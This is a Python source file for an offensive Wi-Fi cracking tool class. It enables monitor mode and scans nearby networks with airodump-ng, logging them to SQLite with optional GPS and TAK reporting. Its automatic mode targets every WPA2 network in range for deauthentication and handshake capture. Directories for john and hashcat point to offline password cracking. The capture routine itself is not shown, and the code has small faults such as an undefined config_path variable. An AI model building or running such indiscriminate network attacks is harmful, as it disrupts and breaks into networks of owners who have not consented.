#!/usr/bin/env python3
import os
import time
import glob
from tabulate import tabulate
import subprocess
import signal
import configparser
import sqlite3
import shutil
import argparse
import re
import sys
try:
    import serial
    # Verify it's pyserial, not the conflicting 'serial' package
    if not hasattr(serial, 'Serial'):
        raise ImportError("Wrong 'serial' module installed. Uninstall 'serial' and install 'pyserial'")
except ImportError:
    # Try importing pyserial explicitly
    try:
        import pyserial as serial
    except ImportError:
        serial = None
        print("[!] WARNING: pyserial not available. GPS serial initialization will fail.")
import json
from datetime import datetime
import threading
from gps3 import gps3
import copy
import xml.etree.ElementTree as ET
import socket
import ssl
import tempfile
import getpass

class wifi_cracker:

    def __init__(self):
        """
        Initializes the wifi_cracker instance by setting up default 
        variables, checking directories, loading the interface from 
        config, and initializing the SQLite database if needed.
        """
        self.target = None
        self.interface = None
        self.verbose = False
        self.debug = False  # Debug mode for detailed debugging output
        self.packets = 100
        self.initial_scan = 30
        self.target_scan = 60
        self.headless = False
        self.word_list = None
        self.target_essid = None
        self.target_scan_attempts = None
        self.capture_attempts = None
        self.handshake_captured = False

        # GPS tracking variables
        self.gps_port = None
        # overwatch branch: network gpsd target, overridable via config/config.ini [GPS]
        self.gps_network_host = "10.0.0.2"
        self.gps_network_port = 2947
        self.tracking_active = False
        self.tracked_essid = None
        self.tracked_bssid = None
        self.tracked_channel = None
        self.initial_signal_strength = None
        self.initial_gps_position = None
        
        # TAK server variables (will be loaded from config/config.ini)
        self.tak_enabled = False
        self.tak_host = None
        self.tak_port = 8087
        self.tak_protocol = 'tcp'  # 'tcp' or 'udp'
        self.tak_cert_file = None
        self.tak_key_file = None
        self.tak_ca_file = None
        self.tak_api_token = None
        self.tak_socket = None
        self.tak_connected = False
        self.tak_last_keepalive = None
        self.tak_keepalive_interval = 30  # Send keepalive every 30 seconds

        self.networks = {} 
        self.table_data = []
        self.directories = ["john", "hc", "logs", "collection","archive", "tracking"]
        self.db_file = "config/networks.db"
        

        self.timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        self.log_file = os.path.join("logs", f"{self.timestamp}.log")
        
        self.latest_gps_position = None
        self.gps_position_last_updated = None
        self.gps_thread = None
        self.gps_thread_stop = threading.Event()
        self.gps_lock = threading.Lock()
        self.gps_status = 'disabled'  # Initialize GPS status
        
        # Log callback for dashboard integration (optional)
        self.log_callback = None
    
    def check_and_create_directories(self):
        """
        Checks for the existence of required directories created by start.sh.
        Does not create directories - errors and directs user to start.sh if missing.
        """
        # Directories as defined in start.sh create_directories function
        # These match exactly what start.sh creates
        required_dirs = [
            "logs",
            "collection",
            "archive/pcap",
            "tracking",
            "john/results",
            "john/archive",
            "hc/archive"
        ]
        
        # Base directories that should exist (for verification)
        base_dirs = ["archive", "john", "hc"]
        
        self.log("Checking system directory structure...", prefix="config")
        
        missing_dirs = []
        
        # Check base directories
        for base_dir in base_dirs:
            if not os.path.exists(base_dir):
                missing_dirs.append(base_dir)
                self.log(f"Base directory '{base_dir}' missing", indent=4, prefix="x")
            else:
                self.log(f"Base directory '{base_dir}' exists", indent=4, prefix="check")
        
        # Check all required directories (including subdirectories)
        for dir_path in required_dirs:
            if not os.path.exists(dir_path):
                missing_dirs.append(dir_path)
                self.log(f"Directory '{dir_path}' missing", indent=4, prefix="x")
            else:
                self.log(f"Directory '{dir_path}' exists", indent=4, prefix="check")
        
        # If any directories are missing, error and direct to start.sh
        if missing_dirs:
            self.log("", prefix="blank")
            self.log("ERROR: Required directories are missing.", prefix="x")
            self.log("Please run './start.sh' to set up the required directory structure.", indent=4, prefix="error")
            self.log("MiFi does not create directories - this must be done via start.sh.", indent=4, prefix="error")
            sys.exit(1)
    
    def initial_config(self):
        self.check_and_create_directories()
        self.init_database()
        # Load GPS network target (host/port) from config/config.ini
        self.load_gps_config()
        # Load TAK configuration from config/config.ini
        self.load_tak_config()

    def configure_interface(self):
        """
        Ensures a monitor-mode interface is configured and available.
        Uses base interface names from config/config.ini (e.g., wlan1, wlp0s20f0u9).
        Automatically detects if their monitor variant is active, or enables it.
        Prompts user only if none match.
        """
        self.log("Configuring interface...", prefix="config")
        
        # First, check for and recover any stuck interfaces
        self._recover_stuck_interfaces()

        config = configparser.ConfigParser()
        config.read("config/config.ini")

        candidates = []
        if "DEFAULT" in config and "monitor_candidates" in config["DEFAULT"]:
            candidates = [iface.strip() for iface in config["DEFAULT"]["monitor_candidates"].split(",")]

        all_interfaces = self._get_interfaces()

        # Step 1: Try each base candidate
        for base_iface in candidates:
            mon_iface = f"{base_iface}mon"

            if mon_iface in all_interfaces and self._is_monitor_mode(mon_iface):
                self.interface = mon_iface
                self.log(f"Found monitor interface for {base_iface}: {mon_iface}", indent=4, prefix="check")
                return True

            elif base_iface in all_interfaces:
                self.log(f"Found base interface {base_iface}, enabling monitor mode...", indent=4, prefix="-")
                try:
                    self.coms(f'airmon-ng start {base_iface}')
                    new_mon_iface = self._find_monitor_interface()
                    if new_mon_iface:
                        self.interface = new_mon_iface
                        self._update_config(base_iface)  # store base name only
                        self.log(f"Enabled monitor mode on {base_iface} → {new_mon_iface}", indent=4, prefix="check")
                        return True
                except subprocess.CalledProcessError:
                    self.log(f"Failed to enable monitor mode on {base_iface}", prefix="x")

        # Step 2: Detect any current monitor interface
        mon_iface = self._find_monitor_interface()
        if mon_iface:
            self.interface = mon_iface
            base = mon_iface.replace('mon', '')
            self.log(f"Detected monitor interface without config: {mon_iface}", indent=4, prefix="check")
            self._update_config(base)
            return True

        # Step 3: Prompt user
        base_ifaces = [iface for iface in all_interfaces if not iface.endswith('mon')]
        if not base_ifaces:
            self.log("No usable wireless interfaces found. Aborting.", prefix="x")
            sys.exit(1)

        self.log("Available interfaces to enable monitor mode:", prefix="blank")
        self._print_interfaces_table(all_interfaces)

        if not self.headless:
            try:
                iface = input("Enter your wireless interface to put into monitor mode (e.g., wlan1): ").strip()
            except KeyboardInterrupt:
                self.log("User aborted input. Exiting.", prefix="x")
                sys.exit(1)

            if iface not in base_ifaces:
                self.log(f"Invalid interface selected: {iface}", prefix="x")
                sys.exit(1)

            try:
                self.coms(f'airmon-ng start {iface}')
                mon_iface = self._find_monitor_interface()
                if mon_iface:
                    self.interface = mon_iface
                    self._update_config(iface)  # store base iface
                    self.log(f"Enabled monitor mode on: {mon_iface}", indent=4, prefix="check")
                    return True
            except subprocess.CalledProcessError:
                self.log("Failed to enable monitor mode on user-provided interface", prefix="x")
                sys.exit(1)

            self.log("No valid monitor-mode interface found. Aborting.", prefix="x")
            sys.exit(1)
        elif self.headless:
            self.log("No known interfaces nor existing interfaces in monitor mode. " \
            "Please adjust config/config.ini or run '--mode config'",
            prefix="x"
            )
            sys.exit(1)

    def _get_interfaces(self):
        """
        Returns a dict of wireless interfaces and their properties.
        Includes phy#, MAC, type, txpower, and wdev.
        No logging is performed here; caller handles output or further processing.
        """
        try:
            result = self.coms(['iw', 'dev'], capture_output=True)
            output = result.stdout

            interfaces = {}
            current_iface = None
            current_phy = None

            for line in output.splitlines():
                line = line.strip()

                phy_match = re.match(r'^phy#(\d+)', line)
                if phy_match:
                    current_phy = f"phy#{phy_match.group(1)}"
                    continue

                iface_match = re.match(r'^Interface\s+(\S+)', line)
                if iface_match:
                    current_iface = iface_match.group(1)
                    interfaces[current_iface] = {
                        'phy': current_phy
                    }
                    continue

                if current_iface:
                    type_match = re.match(r'^type\s+(\S+)', line)
                    if type_match:
                        interfaces[current_iface]['type'] = type_match.group(1)
                        continue

                    addr_match = re.match(r'^addr\s+([0-9a-f:]+)', line)
                    if addr_match:
                        interfaces[current_iface]['mac'] = addr_match.group(1)
                        continue

                    txpower_match = re.match(r'^txpower\s+([\d.]+)\s+dBm', line)
                    if txpower_match:
                        interfaces[current_iface]['txpower'] = float(txpower_match.group(1))
                        continue

                    wdev_match = re.match(r'^wdev\s+(0x[\da-f]+)', line)
                    if wdev_match:
                        interfaces[current_iface]['wdev'] = wdev_match.group(1)
                        continue

            return interfaces

        except subprocess.CalledProcessError:
            return {}

        except subprocess.CalledProcessError:
            # Just re-raise, or handle as you prefer (maybe return empty dict or None)
            raise

    def _print_interfaces_table(self, interfaces: dict):
        """
        Print wireless interfaces info in a slim table format using tabulate.
        """
        headers = ["Interface", "Phy", "Type", "MAC Address", "TxPower (dBm)",]

        # Convert dict to list of rows for tabulate
        table_data = []
        for iface, info in interfaces.items():
            row = [
                iface,
                info.get('phy', '-'),
                info.get('type', '-'),
                info.get('mac', '-'),
                info.get('txpower', '-'),
            ]
            table_data.append(row)

        table_str = tabulate(table_data, headers=headers, tablefmt="simple",
            colalign=("left", "left", "left", "left", "left")
        )
        self.log(table_str, prefix="blank", tabulated=True)

    def _is_monitor_mode(self, iface):
        """Checks if the given interface is in monitor mode."""
        try:
            result = self.coms(['iwconfig', iface], capture_output=True, suppress_stderr=True)
            return 'Mode:Monitor' in result.stdout  
        except subprocess.CalledProcessError:
            return False

    def _find_monitor_interface(self):
        """Returns the first monitor-mode interface found."""
        try:
            result = self.coms(['iw', 'dev'], capture_output=True, check=True)
            interfaces = re.findall(r'Interface\s+(\S+)', result.stdout)
            for iface in interfaces:
                if self._is_monitor_mode(iface):
                    return iface
        except subprocess.CalledProcessError:
            self.log("Failed to run 'iw dev'", prefix="error")
        return None
    
    def _recover_stuck_interfaces(self):
        """
        Checks for interfaces that are stuck in down state and attempts to recover them.
        This helps recover from situations where the interface was left in a bad state.
        """
        try:
            # Get all interfaces
            all_interfaces = self._get_interfaces()
            
            for iface in all_interfaces:
                # Check if interface is down
                try:
                    result = self.coms(['ip', 'link', 'show', iface], capture_output=True, check=False)
                    if result.returncode == 0 and 'state DOWN' in result.stdout:
                        # Try to bring it up
                        try:
                            self.coms(['ip', 'link', 'set', iface, 'up'], check=False)
                            if self.verbose:
                                self.log(f"Recovered stuck interface {iface} (brought up)", indent=4, prefix="check")
                        except Exception:
                            pass  # Non-critical
                except Exception:
                    pass  # Non-critical
        except Exception:
            pass  # Non-critical - recovery is best effort
    
    def _ensure_interface_up(self):
        """
        Ensures the interface is up (not in DOWN state) without changing monitor mode.
        This is a safe operation that only brings up interfaces that are down.
        Does NOT stop monitor mode - interface remains in monitor mode between executions.
        """
        if not self.interface:
            return
        
        try:
            # Check if the current monitor interface is up
            monitor_iface = self._find_monitor_interface()
            if monitor_iface:
                # Check if monitor interface is down
                try:
                    result = self.coms(['ip', 'link', 'show', monitor_iface], capture_output=True, check=False)
                    if result.returncode == 0 and 'state DOWN' in result.stdout:
                        # Bring it up (safe operation, doesn't change monitor mode)
                        try:
                            self.coms(['ip', 'link', 'set', monitor_iface, 'up'], check=False)
                            if self.verbose:
                                self.log(f"Brought monitor interface {monitor_iface} up", indent=4, prefix="check")
                        except Exception:
                            pass  # Non-critical
                except Exception:
                    pass  # Non-critical
            
            # Also check the base interface if it exists
            base_iface = self.interface.replace('mon', '') if self.interface.endswith('mon') else self.interface
            if base_iface != monitor_iface:
                try:
                    result = self.coms(['ip', 'link', 'show', base_iface], capture_output=True, check=False)
                    if result.returncode == 0 and 'state DOWN' in result.stdout:
                        # Bring it up (safe operation)
                        try:
                            self.coms(['ip', 'link', 'set', base_iface, 'up'], check=False)
                            if self.verbose:
                                self.log(f"Brought base interface {base_iface} up", indent=4, prefix="check")
                        except Exception:
                            pass  # Non-critical
                except Exception:
                    pass  # Non-critical
                
        except Exception as e:
            # Non-critical - log but don't fail
            if self.verbose:
                self.log(f"Interface check note: {e}", indent=4, prefix="dash") 

    def _update_config(self, new_iface):
        """Adds a new monitor-mode interface to config/config.ini under monitor_candidates."""
        config = configparser.ConfigParser()
        config.read("config/config.ini")

        # Ensure DEFAULT section exists
        if 'DEFAULT' not in config:
            config['DEFAULT'] = {}

        # Get existing candidates or start new set
        candidates = set()
        if 'monitor_candidates' in config['DEFAULT']:
            candidates.update(i.strip() for i in config['DEFAULT']['monitor_candidates'].split(','))

        # Add new interface
        candidates.add(new_iface)

        # Save updated list
        config['DEFAULT']['monitor_candidates'] = ','.join(sorted(candidates))

        try:
            with open("config/config.ini", "w") as f:
                config.write(f)
            self.log(f"Updated config/config.ini: added '{new_iface}' to monitor candidates.", prefix="config")
        except Exception as e:
            self.log(f"Failed to update config/config.ini: {e}", prefix="x")


    def clean_mode(self):
        """
        Cleans all stored data: removes log files, clears/resets database, 
        and clears interface configuration from config/config.ini.
        """
        self.log("Starting clean mode...", prefix="config")
        
        # Step 1: Remove all log files
        self.log("Removing log files...", indent=4, prefix="dot")
        log_count = 0
        try:
            if os.path.exists("logs"):
                for log_file in glob.glob(os.path.join("logs", "*.log")):
                    try:
                        os.remove(log_file)
                        log_count += 1
                        if self.verbose:
                            self.log(f"Removed: {os.path.basename(log_file)}", indent=8, prefix="dash")
                    except OSError as e:
                        self.log(f"Failed to remove {log_file}: {e}", indent=8, prefix="x")
                self.log(f"Removed {log_count} log file(s)", indent=8, prefix="check")
            else:
                self.log("Logs directory does not exist", indent=8, prefix="dash")
        except Exception as e:
            self.log(f"Error removing log files: {e}", indent=8, prefix="x")
        
        # Step 2: Clear all data from database
        self.log("Clearing database...", indent=4, prefix="dot")
        try:
            if os.path.exists(self.db_file):
                conn = sqlite3.connect(self.db_file)
                c = conn.cursor()
                
                # Delete all data from networks table
                c.execute('DELETE FROM networks')
                networks_deleted = c.rowcount
                
                # Delete all data from signal_tracking table
                c.execute('DELETE FROM signal_tracking')
                tracking_deleted = c.rowcount
                
                conn.commit()
                conn.close()
                
                self.log(f"Cleared {networks_deleted} network record(s) and {tracking_deleted} tracking record(s)", indent=8, prefix="check")
            else:
                self.log(f"Database {self.db_file} does not exist", indent=8, prefix="dash")
                # Create database if it doesn't exist
                self.init_database()
                self.log("Created database file", indent=8, prefix="check")
        except sqlite3.OperationalError as e:
            # If tables don't exist, create them
            if "no such table" in str(e).lower():
                self.log("Tables not found, creating database structure...", indent=8, prefix="dash")
                self.init_database()
                self.log("Created database structure", indent=8, prefix="check")
            else:
                self.log(f"Error clearing database: {e}", indent=8, prefix="x")
        except Exception as e:
            self.log(f"Error clearing database: {e}", indent=8, prefix="x")
        
        # Step 3: Clear interface configuration from config/config.ini
        self.log("Clearing interface configuration...", indent=4, prefix="dot")
        try:
            config = configparser.ConfigParser()
            if os.path.exists("config/config.ini"):
                config.read("config/config.ini")
            else:
                config['DEFAULT'] = {}
            
            # Clear monitor_candidates
            config['DEFAULT']['monitor_candidates'] = ''
            
            with open(config_path, "w") as f:
                config.write(f)
            self.log("Cleared monitor_candidates from config/config.ini", indent=8, prefix="check")
        except Exception as e:
            self.log(f"Error clearing config/config.ini: {e}", indent=8, prefix="x")
        
        self.log("Clean mode complete", prefix="exited")

    def init_database(self):
        """
        Initializes the SQLite database by creating the 'networks' table 
        and 'signal_tracking' table if they don't already exist.
        Requires the database file to exist (created by start.sh).
        """
        # Check if database file exists (should be created by start.sh)
        if not os.path.exists(self.db_file):
            self.log("", prefix="blank")
            self.log(f"ERROR: Database file '{self.db_file}' not found.", prefix="x")
            self.log("Please run './start.sh' to create the database file.", indent=4, prefix="error")
            self.log("MiFi does not create the database file - this must be done via start.sh.", indent=4, prefix="error")
            sys.exit(1)
        
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()
        
        # Create networks table
        c.execute('''
            CREATE TABLE IF NOT EXISTS networks (
                essid TEXT,
                bssid TEXT PRIMARY KEY,
                channel TEXT,
                power TEXT,
                privacy TEXT,
                authentication TEXT,
                cipher TEXT,
                first_seen TEXT,
                last_seen TEXT
            )
        ''')
        
        # Create signal tracking table
        c.execute('''
            CREATE TABLE IF NOT EXISTS signal_tracking (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                essid TEXT NOT NULL,
                bssid TEXT NOT NULL,
                channel TEXT,
                signal_strength TEXT,
                latitude REAL,
                longitude REAL,
                altitude REAL,
                timestamp TEXT,
                session_id TEXT,
                initial_signal_strength TEXT,
                initial_latitude REAL,
                initial_longitude REAL,
                initial_altitude REAL,
                initial_timestamp TEXT
            )
        ''')
        
        conn.commit()
        conn.close()

    def update_database(self, essid, data):
        """
        Inserts or updates network information in the database based on 
        BSSID. Uses UPSERT to avoid duplicates and update existing rows.
        """
        now = time.strftime("%Y-%m-%d %H:%M:%S")
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()

        c.execute('''
            INSERT INTO networks (essid, bssid, channel, power, privacy, authentication, cipher, first_seen, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(bssid) DO UPDATE SET
                essid=excluded.essid,
                channel=excluded.channel,
                power=excluded.power,
                privacy=excluded.privacy,
                authentication=excluded.authentication,
                cipher=excluded.cipher,
                last_seen=excluded.last_seen
        ''', (
            essid,
            data["BSSID"],
            data["Channel"],
            data["Power"],
            data["Privacy"],
            data["Authentication"],
            data["Cipher"],
            now,
            now
        ))

        conn.commit()
        conn.close()

    def debug_print(self, msg, prefix='[DEBUG]', indent=0):
        """
        Print debug message only if debug mode is enabled.
        This is for detailed debugging output that should not appear in normal operation.
        """
        if self.debug:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            indent_str = "    " * indent
            prefix_str = f"{prefix} " if prefix else ""
            final_msg = f"{timestamp} {indent_str}{prefix_str}{msg}"
            print(final_msg, flush=True)
            
            # Also log to file if log_file is set
            if hasattr(self, 'log_file') and self.log_file:
                try:
                    with open(self.log_file, "a", encoding="utf-8") as log:
                        log.write(final_msg + "\n")
                except Exception:
                    pass  # Don't fail if logging fails
    
    def log(self, msg, prefix='default', indent=0, tabulated=False):
        """
        Prints formatted log messages to the console with an optional 
        prefix and indentation level, and writes to a log file.
        """
        prefixes = {
            "default" : "[*] ",
            "dot" : "[•] ",
            "check" : "[✓] ",
            "error" : "[!] ",
            "moved" : "[→] ",
            "exited" : "[←] ",
            "plus" : "[+] ",
            "x" : "[X] ",
            "config" : "[▲] ",
            "blank" : "",
            "dash" : "[-] "
        }

        ind = "" if prefix == "blank" else " " * indent
        prefix_str = prefixes.get(prefix, prefixes["default"])
        clean_msg = msg.strip()
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        final_msg = (
            f"{timestamp} {ind}{prefix_str}{clean_msg}"
            if not tabulated
            else f"{timestamp}\n{ind}{prefix_str}{clean_msg}"
        )
        
        if not self.headless:
            print(final_msg, flush=True)

        try:
            with open(self.log_file, "a", encoding="utf-8") as log:
                log.write(final_msg + "\n")
        except Exception as e:
            print(f"[!] Logging to file failed: {e}")
        
        # Call log callback if set (for dashboard integration)
        if self.log_callback:
            try:
                # Parse the log message for dashboard
                from datetime import datetime
                parsed = {
                    'timestamp': timestamp,
                    'message': clean_msg,
                    'level': 'error' if prefix == 'error' or prefix == 'x' else ('success' if prefix == 'check' or prefix == 'plus' else 'info'),
                    'prefix': prefix_str.strip(),
                    'raw': final_msg
                }
                self.log_callback(parsed)
            except Exception as e:
                # Don't break logging if callback fails
                pass

    def coms(self, command, verbose=None, background=False, preexec_fn=None,
            capture_output=False, check=False, text=True, suppress_stderr=False,
            redirect_output=None, screenshot=False):
        """
        Executes a shell command using subprocess, with flexible control over output, logging, and execution mode.

        Parameters:
        ----------
        command : str or list
            The command to execute. Can be a string (executed via shell) or a list of arguments.
        verbose : bool, optional
            If True, shows output in real time unless suppressed by other options. Defaults to None (use self.verbose).
        background : bool, optional
            If True, runs the command in the background using subprocess.Popen. Defaults to False.
        preexec_fn : callable, optional
            A function to execute in the child process before the command runs (used with Popen).
        capture_output : bool, optional
            If True, captures stdout (and optionally stderr) and returns it as a CompletedProcess object.
            Equivalent to subprocess.PIPE for stdout.
        check : bool, optional
            If True, raises CalledProcessError if the command exits with a non-zero status. Defaults to False.
        text : bool, optional
            If True, decodes output to string (text mode). Defaults to True.
        suppress_stderr : bool, optional
            If True, redirects stderr to DEVNULL (i.e., discards it). Works with capture_output or redirect_output.
        redirect_output : file-like object, optional
            If provided, directs stdout to this file or file-like object.
            If suppress_stderr is also True, stderr is discarded; otherwise, stderr is merged into stdout.

        Returns:
        -------
        subprocess.Popen or subprocess.CompletedProcess
            - If background=True: returns a Popen object.
            - If capture_output=True: returns a CompletedProcess with stdout and stderr.
            - If redirect_output is set: returns a CompletedProcess with output redirected to file.
            - Otherwise: returns a CompletedProcess (or suppresses output depending on verbosity).
        """
        if verbose is None:
            verbose = self.verbose  # Use global verbose if not provided

        if isinstance(command, str):
            shell_mode = True
        else:
            shell_mode = False

        if background:
            stdout = None if verbose else subprocess.DEVNULL
            stderr = None if verbose else subprocess.DEVNULL

            return subprocess.Popen(
                command,
                stdout=stdout,
                stderr=stderr,
                stdin=subprocess.DEVNULL,
                shell=shell_mode,
                preexec_fn=preexec_fn
            )
        else:
            if capture_output:
                result = subprocess.run(
                    command,
                    shell=shell_mode,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL if suppress_stderr else (None if verbose else subprocess.PIPE),
                    text=text,
                    check=check
                )

                if verbose:
                    if result.stdout:
                        for line in result.stdout.strip().splitlines():
                            self.log(line, prefix="blank")
                    if result.stderr and not suppress_stderr:
                        for line in result.stderr.strip().splitlines():
                            self.log(line, prefix="blank")

                if screenshot and result.stdout and not verbose:
                    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
                    final_output = result.stdout.strip().splitlines()
                    clean_lines = [ansi_escape.sub('', line).strip() for line in final_output if line.strip()]
                    snapshot = "\n".join(clean_lines[-10:])
                    self.log(snapshot, prefix="blank")

                return result

            elif redirect_output is not None:
                return subprocess.run(
                    command,
                    shell=shell_mode,
                    stdout=redirect_output,
                    stderr=subprocess.DEVNULL if suppress_stderr else subprocess.STDOUT,
                    check=check
                )

            elif verbose:
                proc = subprocess.Popen(
                    command,
                    shell=shell_mode,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    preexec_fn=os.setsid  # creates a new process group
                )

                try:
                    for line in iter(proc.stdout.readline, ''):
                        clean = line.strip()
                        if clean:
                            self.log(clean, prefix="blank")
                except KeyboardInterrupt:
                    self.log("Interrupted. Terminating subprocess group...", prefix="dash")
                    try:
                        os.killpg(proc.pid, signal.SIGTERM)
                        proc.wait(timeout=2)
                    except (subprocess.TimeoutExpired, ProcessLookupError):
                        try:
                            proc.kill()
                            proc.wait(timeout=1)
                        except:
                            pass
                    raise  # Re-raise KeyboardInterrupt to stop the main program
                except Exception as e:
                    self.log(f"Error reading process output: {e}", prefix="error")

                proc.stdout.close()
                proc.wait()
                return proc

            else:
                return subprocess.run(
                    command,
                    shell=shell_mode,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    check=check
                )

    def parse_capture_filename(self, filename):
        """
        Parses a capture filename in the format 
        ESSID--BSSID--channel--timestamp and returns its components 
        as a dictionary.
        """
        base = os.path.splitext(os.path.basename(filename))[0]
        parts = base.split("--")
        if len(parts) != 4:
            raise ValueError(f"Invalid capture filename format: {filename}")
        
        essid = parts[0].replace("_", " ")
        bssid = parts[1]
        channel = parts[2]
        timestamp = parts[3]
        
        return {
            "ESSID": essid,
            "BSSID": bssid,
            "Channel": channel,
            "Timestamp": timestamp
        }

    def check_directories(self):
        """
        Checks for the existence of required directories and the SQLite 
        database. Creates them if they do not exist.
        """
        self.log(f"Checking system structure...", prefix="config")

        for directory_path in self.directories:
            if not os.path.exists(directory_path):
                self.log(f"Directory '{directory_path}' does not exist. Run start.sh", indent=4, prefix="x")
                sys.exit(1)
                #os.makedirs(directory_path)
            else:
                self.log(f"Directory '{directory_path}' already exists.", indent=4, prefix="check")

        # Step 1: Check if database file exists
        if not os.path.exists(self.db_file):
            self.log(f"Database '{self.db_file}' does not exist. Run start.sh", indent=4, prefix="x")
            sys.exit(1)

        self.log(f"Database '{self.db_file}' already exists.", indent=4, prefix="check")

        # Step 2: Check if 'networks' table exists
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()

        c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='networks';")
        result = c.fetchone()

        if result is None:
            self.log("Table 'networks' does not exist, creating now...", indent=8, prefix="error")
            self.init_database()

        conn.close()

    def scan_networks(self, timeout=None):
        """
        Performs a passive scan for nearby networks and populates self.networks and self.wpa2_targets.
        Accepts a timeout parameter to control scan duration.
        """
        if not self.target_essid:
            self.log("Scanning for networks...", prefix="moved", indent=4)
        scan_timeout = timeout if timeout is not None else self.initial_scan

        try:
            if os.path.exists("dump-01.csv"):
                self.clean()

            cmd = f"sudo timeout {scan_timeout}s airodump-ng -w dump --output-format csv --berlin 3 {self.interface}"
            # Use Popen with polling to allow KeyboardInterrupt during execution
            # Important: Set stdin=DEVNULL to prevent airodump-ng from waiting for input
            try:
                proc = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdin=subprocess.DEVNULL,  # Prevent waiting for input
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    preexec_fn=os.setsid
                )
                # Poll the process periodically to allow KeyboardInterrupt to be caught
                while proc.poll() is None:
                    time.sleep(0.1)  # Small sleep to allow interrupt
                if proc.returncode != 0 and proc.returncode != 124:  # 124 is timeout exit code
                    raise subprocess.CalledProcessError(proc.returncode, cmd)
            except KeyboardInterrupt:
                # Kill the subprocess if interrupted
                try:
                    os.killpg(proc.pid, signal.SIGTERM)
                    proc.wait(timeout=2)
                except (subprocess.TimeoutExpired, ProcessLookupError):
                    try:
                        proc.kill()
                        proc.wait(timeout=1)
                    except:
                        pass
                raise  # Re-raise KeyboardInterrupt
        except KeyboardInterrupt:
            # Re-raise KeyboardInterrupt to stop the main program
            raise
        except subprocess.CalledProcessError as e:
            if e.returncode == 124:
                self.log("Airodump-ng timed out as expected.", indent=4, prefix="check")
            else:
                self.log(f"Airodump-ng failed with error code {e.returncode}", indent=4, prefix="error")
                return False

        self.networks = {}
        self.wpa2_targets = {}

        try:
            with open("dump-01.csv", "r", encoding="utf-8", errors="ignore") as file:
                lines = file.readlines()
        except FileNotFoundError:
            self.log("dump-01.csv not found after scan.", prefix="error")
            return False

        for line in lines:
            line = line.strip()
            if line.startswith("BSSID"):
                continue
            elif line.startswith("Station MAC"):
                break
            elif line.count(",") > 10:
                fields = line.split(",")
                if len(fields) >= 14:
                    bssid = fields[0].strip()
                    power = fields[8].strip()
                    channel = fields[3].strip()
                    privacy = fields[5].strip()
                    auth = fields[6].strip()
                    cipher = fields[7].strip()
                    essid = fields[13].strip()

                    if essid:
                        net_data = {
                            "BSSID": bssid,
                            "Channel": channel,
                            "Power": power,
                            "Privacy": privacy,
                            "Authentication": auth,
                            "Cipher": cipher
                        }

                        self.networks[essid] = net_data
                        self.update_database(essid, net_data)

                        is_wpa2 = (
                            "WPA2" in privacy.upper() or
                            "WPA2" in auth.upper() or
                            "WPA2" in cipher.upper()
                        )
                        is_open = "OPN" in privacy.upper() or "OPEN" in privacy.upper()
                        is_wep = "WEP" in privacy.upper()
                        is_wpa3 = "WPA3" in privacy.upper() or "SAE" in auth.upper()

                        if is_wpa2 and not is_wep and not is_open and not is_wpa3:
                            self.wpa2_targets[essid] = net_data

        return True

    def display_networks(self):
        self.table_data = []
        for essid, data in self.networks.items():
            self.table_data.append([
                essid,
                data['BSSID'],
                data['Channel'],
                data['Power'],
                data['Privacy'],
                data['Authentication'],
                data['Cipher']
            ])

        headers = ["ESSID", "BSSID", "Channel", "Power", "Encryption", "Auth", "Cipher"]
        self.log("Detected Networks:", prefix="blank")
        table_str = tabulate(self.table_data, headers=headers, tablefmt="fancy_grid")
        self.log(table_str, prefix="blank", tabulated=True)

    def collect(self, mode=None, target_essid=None, target_scan_attempts=None, capture_attempts=None, packets=None, target_scan=None, initial_scan=None):
        if self.interface is None:
            self.configure_interface()

        if target_essid:
            self.collect_targeted(target_essid, target_scan_attempts, capture_attempts, packets, target_scan, initial_scan)
        elif mode == "auto":
            self.collect_auto_mode(packets, target_scan, initial_scan)
        else:
            self.collect_manual_mode(initial_scan, target_scan, packets)

    def collect_manual_mode(self, initial_scan=None, target_scan=None, packets=None):
        """
        Manual mode: allows repeated manual selection of ESSIDs 
        until the user chooses to quit.
        """
        # Initial scan
        if not self.scan_networks(timeout=initial_scan):
            self.log("Scan failed. Exiting manual mode.", prefix="error")
            return False

        while True:
            #sys.stdout.flush()
            self.display_networks()

            while True:
                target = input("Enter the Network ESSID ('rs' to rescan,'q' to quit): ").strip()

                if target.lower() in ['q', 'quit']:
                    self.log("Exiting manual mode...", prefix="exited")
                    self.clean()
                    return False
                if target.lower() in ['rs', 'rescan']:
                    if not self.scan_networks(timeout=initial_scan):
                        self.log("Scan failed. Exiting manual mode.", prefix="error")
                        return False
                    break  # Break inner loop to redisplay networks
                if not target:  # Empty input
                    self.log("No ESSID entered. Please enter a valid ESSID or command.", prefix="error")
                    continue
                if target in self.networks:
                    self.capture_handshake(target, target_scan=target_scan, packets=packets)
                    break  # Break inner loop to redisplay networks after capture
                else:
                    self.log("Invalid ESSID selected. Please try again.", prefix="error")
                    continue

    def collect_auto_mode(self, packets=None, target_scan=None, initial_scan=None):
        """
        Automatic mode: tries to capture handshakes from all WPA2 networks.
        """
        if not self.scan_networks(timeout=initial_scan):
            self.log("Scan failed in auto mode.", prefix="error")
            return False
        
        self.display_networks()

        if not self.wpa2_targets:
            self.log("No WPA2 networks found.", prefix="error")
            return False
        
        self.log("Running in Automatic Mode (WPA2 targets only)...", prefix="config")
        self.log(f"Deauth packets: {packets}", indent=4, prefix="dot")
        self.log(f"Deauth timeout: {target_scan}", indent=4, prefix="dot")

        for network in self.wpa2_targets:
            channel = self.networks[network]['Channel']
            self.log(f"Targeting WPA2 network: {network} on channel {channel}", prefix='moved')
            self.capture_handshake(network, auto=True, target_scan=target_scan, packets=packets)

        self.log("Automatic collection complete.", prefix="exited")
        return True

